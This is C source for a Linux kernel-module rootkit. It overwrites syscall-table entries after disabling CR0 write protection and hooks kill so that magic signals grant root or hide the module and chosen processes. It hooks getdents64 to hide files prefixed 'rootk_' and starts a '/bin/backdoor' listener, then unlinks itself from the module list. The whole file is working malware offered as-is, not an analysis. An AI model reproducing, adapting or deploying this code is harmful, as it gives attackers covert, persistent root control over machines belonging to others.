#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <asm/paravirt.h>
#include <linux/dirent.h>

#define SHELL "/bin/backdoor"             /* path to backdoor binary */

MODULE_LICENSE("GPL");

unsigned long* __sys_call_table = NULL;

static bool dir_hidden = true;            /* are dirents hidden */
static char *prefix = "rootk_";           /* hide directories with prefix */
char hide_pid[NAME_MAX];                  /* pid's to hide */

static bool hidden = true;                /* is this module hidden */
static struct list_head *prev_module;     /* contains previous module in module linked list */


/* define original syscalls */
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
static ptregs_t orig_getdents64;


/* start userspace backdoor application */
static int start_listener(void){
	char *argv[] = { SHELL, NULL, NULL };
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

/*
 * linked list data structure for storing all pid's to be hidden
 */

typedef struct node {
    pid_t pid;
    struct node * next;
} hidden_pid_t;

hidden_pid_t *head = NULL;

/* return a list with pid added in front of head */
static hidden_pid_t* addToList(hidden_pid_t *head, pid_t pid) {
    hidden_pid_t *new = (hidden_pid_t *) kvzalloc(sizeof(hidden_pid_t), GFP_KERNEL);
    if (new == NULL) {
        return head;
    }
    new->pid = pid;
    new->next = head;
    return new;
}

/* return a list with pid removed from head */
static hidden_pid_t* removeFromList(hidden_pid_t *head, pid_t pid) {
    hidden_pid_t *before = head, *tmp;

    if (head->pid == pid) {
        return head->next;
    }
    
    for (tmp = head->next; tmp != NULL; tmp = tmp->next) {
        if (tmp->pid == pid) {
            before->next = tmp->next;
            kvfree(tmp);
            break;
        }
        before = tmp;
    }
    return head;
}

/* return pointer to element in list with pid */
static hidden_pid_t* findInList(hidden_pid_t *head, char *pid) {
    hidden_pid_t *tmp = head;  
    char str[15];
    
    while (tmp != NULL) {
        sprintf(str, "%d", tmp->pid);
        if (!memcmp(str, pid, strlen(str))) {
            return tmp;
        }
        tmp = tmp->next;
    }
    return NULL;
}

/* bool wrapper for findInList */
static bool isInList(hidden_pid_t *head, char *pid) {
    if (!head) return false;
    return findInList(head, pid) != NULL;
}

/* frees the memory of all list members */
static void unitalize(hidden_pid_t *head) {
    hidden_pid_t *tmp = head;
    while (tmp != NULL) {
        hidden_pid_t *tmp2 = tmp->next;
        kvfree(tmp);
        tmp = tmp2;
    }
}



static void hide_module(void)
{
    /* delete yourself from module linked list */
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void show_module(void)
{
    /* add yourself to module linked list after prev_module*/
    list_add(&THIS_MODULE->list, prev_module);
}

static void become_root(void)
{
    /* get the creds (uid, gid, ...) of the calling process */
    struct cred *proc_creds;
    proc_creds = prepare_creds();

    /* set all id's to root */
    proc_creds->uid.val = proc_creds->gid.val = 0;
    proc_creds->euid.val = proc_creds->egid.val = 0;
    proc_creds->suid.val = proc_creds->sgid.val = 0;
    proc_creds->fsuid.val = proc_creds->fsgid.val = 0;

    commit_creds(proc_creds);
}

/* define new custom syscalls
 *
 * hacked kill */
static asmlinkage int hack_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    pid_t pid = regs->di;

    if (sig == 64){
        become_root();
        return 0;
    }
    else if ((sig == 63) && (!hidden)){
        hide_module();
        hidden = true;
        return 0;
    }
    else if ((sig == 63) && (hidden)){
        show_module();
        hidden = false;
        return 0;
    }
    else if (sig == 62)
    {
        head = addToList(head, pid);
        return 0;
    }
    else if (sig == 61)
    {
        head = removeFromList(head, pid);
        return 0;
    }
    else
        return orig_kill(regs);
}

/* hacked getdents64 */
static asmlinkage int hack_getdents64(const struct pt_regs *regs)
{
    long err;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *previous_dir, *dirent_ker = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(regs);
    dirent_ker = kvzalloc(ret, GFP_KERNEL);
    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    if (!dir_hidden){
        /* nothing to hide */ 
        goto done;
    }
    
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err) 
        goto done;

    /* Loop over offset (loop over all entries) */
    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        if ((memcmp(prefix, current_dir->d_name, strlen(prefix)) == 0) ||
            (isInList(head, current_dir->d_name))) {
            
            /* found entry to hide*/
            
            if (current_dir == dirent_ker){
                /* entry is the first one */
                /* Decrement ret and shift all the structs up in memory */
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen so that we iterate over
         * the other structs when we loop
         */
        offset += current_dir->d_reclen;
    }

    err = copy_to_user(dirent, dirent_ker, ret);
    if (err) 
        goto done;

done:
    kvfree(dirent_ker);
    return ret;
}


/* store original syscalls */
static int store(void)
{
    /* kill */
    orig_kill = (ptregs_t)__sys_call_table[__NR_kill];

    /* getdents64 */
    orig_getdents64 = (ptregs_t)__sys_call_table[__NR_getdents64];
    return 0;
}

/* Overwrite Syscall table with own functions */
static int hook(void)
{
    /* kill */
    __sys_call_table[__NR_kill] = (unsigned long)&hack_kill;

    /* getdents64 */
    __sys_call_table[__NR_getdents64] = (unsigned long)&hack_getdents64;

    return 0;
}

/* Write original Syscalls back to the Syscall table */
static int cleanup(void)
{
    /* kill */
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;

    /* getdents64 */
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;

    return 0;
}


/* 
 * For Kernel versions after 5.7.0 the function kallsyms_lookup_name
 * isn't exported anymore, so it be called from LKM's directly. 
 * So we're using KProbes to find the address of kallsyms_lookup_name.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

static unsigned long* get_syscall_table(void)
{
    unsigned long* syscall_table;

#ifdef KPROBE_LOOKUP

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;

    register_kprobe(&kp);

    /* assign kallsyms_lookup_name symbol to kp.addr */
    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;

    unregister_kprobe(&kp);
#endif
    
    /* use kallsyms_lookup_name to get the syscall_table */ 
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    return syscall_table;
}


/* custom write_cr0 function */
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static void protect_memory(void)
{
    /* Set the 16th bit (Write Protection) to 1 */
    write_cr0_forced(read_cr0() | (0x10000));
}

static void unprotect_memory(void)
{
    /* Set the 16th bit (Write Protection) to 0 */
    write_cr0_forced(read_cr0() & (~ 0x10000));
}



static int __init mod_init(void)
{
    __sys_call_table = get_syscall_table();
    store();
    unprotect_memory();
    hook();
    protect_memory();

    start_listener();
    hide_module();

    return 0;
}

static void __exit mod_exit(void)
{
    unprotect_memory();
    cleanup();
    protect_memory();
    
    unitalize(head);
}

module_init(mod_init);
module_exit(mod_exit);
